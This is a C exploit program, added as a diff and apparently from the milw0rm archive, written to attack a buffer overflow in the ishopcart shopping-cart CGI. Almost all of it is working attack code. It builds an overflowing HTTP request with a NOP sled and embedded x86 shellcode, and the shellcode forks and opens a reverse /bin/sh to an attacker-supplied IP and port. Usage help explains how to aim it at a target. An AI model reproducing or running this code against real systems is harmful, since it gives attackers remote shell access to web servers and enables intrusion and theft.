@@ -1,0 +1,173 @@
+/* Creator: K-sPecial (xzziroz.net) of .aware (awarenetwork.org)
+ * Name: ishopcart-cgi-bof.c (<= easy-scart6.c)
+ * Date: 5/25/2006
+ * Version:
+ *  1.00 (5/25/2006) - ishopcart-cgi-bof.c created
+ *
+ * Description: there is an overflow in the vGetPost() function, it does not do any size checking on the inputed data but instead
+ *  reads until the word "Submit" is encountered, in turn overflowing pszBuf which points to a 4000 byte buffer in main(). Complete
+ *  code execution is spawned, with the code being a connectback shell.
+ *
+ * Notes: I could not for the life of me find any connect back shellcode that forks! This code needed to fork because apache
+ *  was killing the connect back process as soon as it connected. So, in turn, I have modified netric's callback shellcode with
+ *  some forking shellcode to accomplish the workaround.
+ *
+ * Compile: gcc -o icb ishopcart-cgi-bof.c -std=c99
+*/
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <string.h>
+#include <getopt.h>
+#include <errno.h>
+#include <stdlib.h>
+
+#define PORT 		80
+#define CB_PORT		31337
+#define IP_OFFSET       33 + 13
+#define PORT_OFFSET     39 + 13    // + 13 to these for the new forking mod added to cb[]
+#define OFFSET		0x41414141 // find your own damn offset, the code works 100% any fault is on yourself
+
+void changeip(char *ip);
+void changeport(char *code, int port, int offset);
+void help(void);
+
+// netric callback shellcode
+char cb[] =
+        "\x31\xc0\x31\xdb" 
+
+        "\xb0\x02"                      // movb         $0x2,%al        / sys_fork (2)
+        "\xcd\x80"                      // int          $0x80
+        "\x38\xc3"                      // cmpl         %ebx,%eax       / check if child; %eax = 0x0
+        "\x74\x05"                      // je           0x5             / jump after the exit if we're the child
+        // sys_exit (1)
+        "\x8d\x43\x01"                  // leal         0x1(%ebx),%eax  / sys_exit (1) if we're the parent
+        "\xcd\x80"                      // int          $0x80           / interrupt 80 to execute sys_exit
+	
+	"\x31\xc9\x51\xb1"
+        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
+        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
+        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
+        "\x68\x41\x42\x43\x44\x66\x68\xb0"
+        "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
+        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
+        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
+        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
+        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
+        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
+        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
+        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
+        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
+        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
+        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
+        "\x01\xcd\x80";
+
+int main (int argc, char **argv) {
+	int sock;
+	unsigned offset = OFFSET, ipaddr, i = 0;
+	unsigned short port = PORT, cbport = CB_PORT;
+	struct sockaddr_in server;
+	char *host, *location, *cbip, buff[5120], opt;
+
+	host = location = cbip = 0;
+	
+	while ((opt = getopt(argc, argv, "i:p:o:l:1:2:h")) != -1) {
+		switch(opt) { 
+			case 'i':
+				host = optarg;
+				break;
+			case 'p':
+				sscanf(optarg, "%hu", &port);
+				break;
+			case 'o':
+				sscanf(optarg, "%x", &offset);
+				break;
+			case 'l':
+				location = optarg;
+				break;
+			case '1':
+				cbip = optarg;
+				break;
+			case '2':
+				sscanf(optarg, "%hu", &cbport);
+				break;
+		}
+	}
+
+	if (!(host && location && cbip)) { 
+		puts("-!> a required argument was missing\n");
+		help();
+		exit(1);
+	}
+
+        changeip(cbip);
+	changeport(cb, cbport, PORT_OFFSET);
+	
+	if ((sock = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
+		printf("socket() error: %s\n", strerror(errno));
+		exit(1);
+	}
+	server.sin_port = htons(port);	
+
+        if ((ipaddr = inet_addr(host)) == -1) {
+		struct hostent *myhost;
+		if ((myhost = gethostbyname(host)) == 0) {
+			printf("-!> failed to resolve host '%s'\n", host);
+			exit(1);
+		}
+		memcpy((char*) &server.sin_addr, myhost->h_addr, myhost->h_length);
+	}
+	else server.sin_addr.s_addr = ipaddr;
+
+	server.sin_family = AF_INET;
+	memset(&(server.sin_zero), 0, 8);
+
+        if (connect(sock, (struct sockaddr *) &server, sizeof(server)) != 0) {
+	        printf("-!> connect() to '%s:%hu' failed: %s\n", host, port, strerror(errno));
+		exit(1);
+	}
+	sprintf(buff, "GET %s?sslinvoice HTTP/1.1\nHost: %s\nContent-Length: %u\n\n", location, host, 4000 + sizeof(cb) + 512 - 1 + strlen("Submit"));
+	send(sock, buff, strlen(buff), 0);
+
+	for (0; i < 4000; i++) *(buff+i) = 0x90;
+	for (unsigned a = 0; a < sizeof(cb) - 1; i++, a++)  *(buff+i) = *(cb+a);
+	for (unsigned a = 0; a < 128; i += 4, a++) memcpy(buff+i, &offset, 4);
+	
+	strcpy(buff+4000+sizeof(cb)+512 - 1, "Submit\n");
+
+	
+	send(sock, buff, 4000 + sizeof(cb) + 512 - 1 + strlen("Submit"), 0);
+}
+
+void help (void) { 
+	char *string = "ishopcart CGI shopcart buffer overflow exploit by K-sPecial (http://xzziroz.net) of .aware (http://awarenetwork.org)\nLicense: GPL (5/24/2006)\n\n"
+		       "-i <%s>  \t - specifies the vulnerable host; default 80\n"
+		       "-p [%hu] \t - specifies the vulnerable host's port\n"
+		       "-l <%s>  \t - specifies the vulnerable CGI location\n"
+		       "-o [%x]  \t - forces an explicit offset\n"
+		       "-1 <%s>  \t - specifies the connect back ip\n"
+		       "-2 [%hu] \t - specifies the connect back port; default 31337\n"
+		       "-h	 \t - shows this help\n";
+
+	puts(string);
+}		       
+
+void changeip(char *ip) {
+        char *ptr;
+        ptr=cb+IP_OFFSET;
+        /* Assume Little-Endianess.... */
+        *((long *)ptr)=inet_addr(ip);
+}
+
+// ripped from some of snooq's code
+void changeport(char *code, int port, int offset) {
+        char *ptr;
+        ptr=code+offset;
+        /* Assume Little-Endianess.... */
+        *ptr++=(char)((port>>8)&0xff);
+        *ptr++=(char)(port&0xff);
+}
+
+// milw0rm.com [2006-06-02]
